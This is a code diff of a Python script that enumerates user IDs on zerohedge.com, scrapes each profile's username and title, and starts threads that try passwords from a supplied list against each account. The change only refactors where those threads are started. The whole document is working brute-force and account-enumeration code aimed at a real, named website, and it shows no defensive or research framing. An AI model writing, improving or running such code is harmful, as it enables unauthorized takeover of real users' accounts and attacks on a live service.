@@ -32,10 +32,10 @@ def attempt(entry, passwords):
 #
 # sleep for one second if an error is returned
 
-def evaluate(number, passwords):
-	try:
-		entry = [number]
+def evaluate(number):
+	entry = [number]
 
+	try:
 		response = requests.get("http://zerohedge.com/user/" + number).text
 #
 # request information from the user page to fill the entry
@@ -51,12 +51,10 @@ def evaluate(number, passwords):
 #
 # append the title to the entry
 
-			threading.Thread(target=attempt, args=(entry, passwords)).start()
-#
-# begin a thread to attempt the entry with the given password list
-
 	except Exception as error:
 		pass
+	
+	return entry
 
 def main(passwords):
 	output(["Number", "Username", "Title", "Password"])
@@ -66,9 +64,14 @@ def main(passwords):
 	number = 0
 
 	while True:
-		evaluate(str(number), passwords)
+		entry = evaluate(str(number))
 #
 # evaluate the user identification number
+
+		if len(entry) > 1:
+			threading.Thread(target=attempt, args=(entry, passwords)).start()
+#
+# begin a thread to attempt the entry with the given password list
 
 		number += 1
 
